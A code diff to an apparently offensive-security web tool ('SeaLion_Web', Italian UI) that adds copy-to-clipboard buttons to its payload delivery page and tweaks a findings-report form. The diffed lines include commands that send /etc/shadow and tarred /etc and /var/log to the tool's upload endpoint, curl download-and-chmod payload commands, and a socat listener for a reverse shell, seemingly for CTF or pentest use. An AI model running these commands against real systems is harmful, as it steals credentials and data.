@@ -989,6 +989,20 @@ def _base_html(title: str, body: str, active: str = "") -> str:
 <title>{html.escape(title)} — SeaLion_Web</title>
 <link rel="stylesheet" href="{_CSS_HLJS}">
 <style>{_CSS}</style>
+<style>
+#sl-toast{{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);
+background:var(--surface);border:1px solid var(--accent);color:var(--accent);
+padding:9px 20px;border-radius:6px;font-size:13px;font-family:inherit;
+opacity:0;pointer-events:none;transition:opacity .35s ease;z-index:9999;
+box-shadow:0 4px 18px rgba(0,0,0,.45)}}
+#sl-toast.show{{opacity:1}}
+.copy-btn{{background:transparent;border:1px solid var(--border);border-radius:4px;
+color:var(--text2);cursor:pointer;font-size:11px;padding:1px 7px;margin-left:6px;
+vertical-align:middle;line-height:1.5}}
+.copy-btn:hover{{color:var(--accent);border-color:var(--accent)}}
+.copyable{{cursor:pointer}}
+.copyable:hover code{{color:var(--accent)}}
+</style>
 <script src="{_JS_MARKED}"></script>
 <script src="{_JS_HLJS}"></script>
 </head><body>
@@ -1046,6 +1060,40 @@ def _base_html(title: str, body: str, active: str = "") -> str:
       if(first)location.href=first.href;
       else if(input.value.trim().length>=2)location.href='/search?q='+encodeURIComponent(input.value.trim());
     }}
+  }});
+}})();
+</script>
+<div id="sl-toast"></div>
+<script>
+(function(){{
+  var toastTimer=null;
+  window.slToast=function(msg){{
+    var t=document.getElementById('sl-toast');
+    if(!t)return;
+    t.textContent=msg||'Copiato!';
+    t.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer=setTimeout(function(){{t.classList.remove('show');}},1600);
+  }};
+  window.slCopy=function(text,msg){{
+    function done(){{slToast(msg||'Comando copiato negli appunti ✔');}}
+    if(navigator.clipboard&&navigator.clipboard.writeText){{
+      navigator.clipboard.writeText(text).then(done).catch(function(){{fallback();}});
+    }}else{{fallback();}}
+    function fallback(){{
+      var ta=document.createElement('textarea');
+      ta.value=text;ta.style.position='fixed';ta.style.opacity='0';
+      document.body.appendChild(ta);ta.select();
+      try{{document.execCommand('copy');done();}}catch(e){{slToast('Copia non riuscita');}}
+      document.body.removeChild(ta);
+    }}
+  }};
+  // delega globale: qualunque elemento con data-copy copia al click
+  document.addEventListener('click',function(e){{
+    var el=e.target.closest('[data-copy]');
+    if(!el)return;
+    e.preventDefault();
+    slCopy(el.getAttribute('data-copy'),el.getAttribute('data-copy-msg'));
   }});
 }})();
 </script>
@@ -1619,6 +1667,16 @@ def _dl_cmds(base: str, name: str) -> tuple[str, list[str]]:
     return lin, win
 
 
+def _copy_line(os_label: str, cmd: str) -> str:
+    """Riga di comando cliccabile (click = copia) con bottone 📋 dedicato."""
+    raw = html.escape(cmd, quote=True)
+    return (f'<div class="fcmd"><span class="fcmd-os">{os_label}</span> '
+            f'<span class="copyable" data-copy="{raw}" title="Clicca per copiare">'
+            f'{html.escape(cmd)}</span>'
+            f'<button class="copy-btn" data-copy="{raw}" '
+            f'title="Copia il comando">📋 copia</button></div>')
+
+
 def _page_static_list() -> str:
     files = []
     if STATIC_ROOT.is_dir():
@@ -1642,11 +1700,9 @@ def _page_static_list() -> str:
         name = f.name
         cmd, win_cmds = _dl_cmds(base, name)
         ename = html.escape(name)
-        win_html = "".join(
-            f'<div class="fcmd"><span class="fcmd-os">win</span> {html.escape(w)}</div>'
-            for w in win_cmds)
+        win_html = "".join(_copy_line("win", w) for w in win_cmds)
         cards += f"""<div class="file-card">
-<div style="min-width:0;flex:1"><div class="fname">{ename}</div><div class="fcmd"><span class="fcmd-os">linux</span> {html.escape(cmd)}</div>{win_html}</div>
+<div style="min-width:0;flex:1"><div class="fname">{ename}</div>{_copy_line("linux", cmd)}{win_html}</div>
 <div class="fsize" style="margin:0 12px">{label}</div>
 <div class="actions">
 <a class="btn" href="/static/edit/{ename}">Apri</a>
@@ -3188,7 +3244,7 @@ function renderFindingForm(){{
     textarea('f-impact','Impatto',f.impact,60)+
     textarea('f-remediation','Remediation',f.remediation,60)+
     field('f-refs','Riferimenti (URL)',f.refs,'https://nvd.nist.gov/vuln/detail/CVE-...')+
-    textarea('f-evidence','Evidenze testuali (output comandi)',f.evidence,70)+
+    textarea('f-evidence','Evidenze testuali (output comandi — di default racchiuse in ```, toglile pure se non servono)',(EDIT_IDX>=0?(f.evidence||''):(f.evidence&&f.evidence.trim()?f.evidence:'```\n\n```')),70)+
     '<div class="wiz-field"><label>Immagini evidenza (con didascalia sotto)</label>'+
     '<div id="f-images"></div>'+
     '<div style="display:flex;gap:8px;align-items:center;margin-top:6px">'+
@@ -3235,8 +3291,8 @@ function libUse(i){{
   document.getElementById('f-impact').value=r.impact||'';
   document.getElementById('f-remediation').value=r.remediation||'';
   if(r.refs)document.getElementById('f-refs').value=r.refs;
-  if(r.verification && !document.getElementById('f-evidence').value.trim())
-    document.getElementById('f-evidence').value=r.verification;
+  if(r.verification && !document.getElementById('f-evidence').value.replace(/`/g,'').trim())
+    document.getElementById('f-evidence').value='```\n'+String(r.verification).trim()+'\n```';
   if(!gv('f-assets')){{
     var hosts=(DATA.meta.scope||[]).map(function(x){{return (x.host||'').trim();}}).filter(function(x){{return x;}});
     document.getElementById('f-assets').value=hosts.join(', ')||DATA.meta.domain||'';
@@ -4441,7 +4497,7 @@ def _page_delivery() -> str:
         ep_cards += f"""<div class="delivery-card">
 <div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
 <div class="dc-desc">{desc}</div>
-<div class="dc-cmd"><code>{html.escape(curl_cmd)}</code></div>
+<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(curl_cmd, quote=True)}" title="Clicca per copiare">{html.escape(curl_cmd)}</code><button class="copy-btn" data-copy="{html.escape(curl_cmd, quote=True)}" title="Copia il comando">📋 copia</button></div>
 <div class="dc-prereq">{prereq}</div>
 </div>\n"""
 
@@ -4450,7 +4506,7 @@ def _page_delivery() -> str:
         enum_cards += f"""<div class="delivery-card">
 <div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
 <div class="dc-desc">{desc}</div>
-<div class="dc-cmd"><code>{html.escape(curl_cmd)}</code></div>
+<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(curl_cmd, quote=True)}" title="Clicca per copiare">{html.escape(curl_cmd)}</code><button class="copy-btn" data-copy="{html.escape(curl_cmd, quote=True)}" title="Copia il comando">📋 copia</button></div>
 <div class="dc-prereq">{prereq}</div>
 </div>\n"""
 
@@ -4475,7 +4531,7 @@ def _page_delivery() -> str:
 {ws_fmt_opts}</select></label>
 <button onclick="wsDownload()" style="background:var(--surface);color:var(--accent);border:1px solid var(--border);border-radius:4px;padding:5px 14px;font-size:12px;cursor:pointer">⬇ Scarica</button>
 </div>
-<div class="dc-cmd"><code id="ws-url"></code></div>
+<div class="dc-cmd"><code id="ws-url" class="copyable" onclick="slCopy(this.textContent)" title="Clicca per copiare"></code><button class="copy-btn" onclick="slCopy(document.getElementById('ws-url').textContent)" title="Copia il comando">📋 copia</button></div>
 <div class="dc-prereq">Prerequisito: <code>socat file:$(tty),raw,echo=0 tcp-listen:{_lport}</code></div>
 </div>
 <script>
@@ -4514,13 +4570,21 @@ wsUpdate();
         elif name.endswith(".exe"):
             cmd = f"curl {base}/{name} -o {name}"
         else:
-            cmd = f"curl {base}/{name} -o {name} &amp;&amp; chmod +x {name}"
+            cmd = f"curl {base}/{name} -o {name} && chmod +x {name}"
         _, win_cmds = _dl_cmds(base, name)
-        win_html = "<br>".join(f"<code>{html.escape(w)}</code>" for w in win_cmds)
+        lin_html = (f'<code class="copyable" data-copy="{html.escape(cmd, quote=True)}" '
+                    f'title="Clicca per copiare">{html.escape(cmd)}</code>'
+                    f'<button class="copy-btn" data-copy="{html.escape(cmd, quote=True)}" '
+                    f'title="Copia il comando">📋</button>')
+        win_html = "<br>".join(
+            f'<code class="copyable" data-copy="{html.escape(w, quote=True)}" '
+            f'title="Clicca per copiare">{html.escape(w)}</code>'
+            f'<button class="copy-btn" data-copy="{html.escape(w, quote=True)}" '
+            f'title="Copia il comando">📋</button>' for w in win_cmds)
         file_rows += f"""<tr>
 <td class="dc-fname">{html.escape(name)}</td>
 <td class="dc-fsize">{label}</td>
-<td class="dc-fcmd"><code>{cmd}</code></td>
+<td class="dc-fcmd">{lin_html}</td>
 <td class="dc-fcmd">{win_html}</td></tr>\n"""
 
     if not file_rows:
@@ -4556,13 +4620,13 @@ wsUpdate();
 <div class="delivery-card">
 <div class="dc-header"><span class="dc-endpoint">/upload</span><span class="dc-title">Upload File</span></div>
 <div class="dc-desc">Carica file dalla vulnbox verso la cartella <code>loot/</code> del server. I file vengono salvati con timestamp e IP sorgente.</div>
-<div class="dc-cmd"><code>{html.escape(f'curl -F "file=@/path/to/file" {base}/upload')}</code></div>
+<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'curl -F "file=@/path/to/file" {base}/upload', quote=True)}" title="Clicca per copiare">{html.escape(f'curl -F "file=@/path/to/file" {base}/upload')}</code><button class="copy-btn" data-copy="{html.escape(f'curl -F "file=@/path/to/file" {base}/upload', quote=True)}" title="Copia il comando">📋 copia</button></div>
 <div style="color:var(--text2);font-size:12px;margin:4px 0">Upload file singolo con multipart form</div>
-<div class="dc-cmd"><code>{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt')}</code></div>
+<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt', quote=True)}" title="Clicca per copiare">{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt')}</code><button class="copy-btn" data-copy="{html.escape(f'cat /etc/shadow | curl -X POST -d @- {base}/upload/shadow.txt', quote=True)}" title="Copia il comando">📋 copia</button></div>
 <div style="color:var(--text2);font-size:12px;margin:4px 0">Upload via pipe (contenuto come body)</div>
-<div class="dc-cmd"><code>{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db')}</code></div>
+<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db', quote=True)}" title="Clicca per copiare">{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db')}</code><button class="copy-btn" data-copy="{html.escape(f'curl -T /tmp/database.db {base}/upload/database.db', quote=True)}" title="Copia il comando">📋 copia</button></div>
 <div style="color:var(--text2);font-size:12px;margin:4px 0">Upload con PUT</div>
-<div class="dc-cmd"><code>{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz')}</code></div>
+<div class="dc-cmd"><code class="copyable" data-copy="{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz', quote=True)}" title="Clicca per copiare">{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz')}</code><button class="copy-btn" data-copy="{html.escape(f'tar czf - /etc /var/log | curl -X POST -d @- {base}/upload/exfil.tar.gz', quote=True)}" title="Copia il comando">📋 copia</button></div>
 <div style="color:var(--text2);font-size:12px;margin:4px 0">Esfiltra cartelle intere compressi via tar</div>
 </div>
 <div style="margin-top:8px;font-size:12px;color:var(--text2)">I file sono consultabili nella sezione <a href="/loot/">Loot</a>.</div>
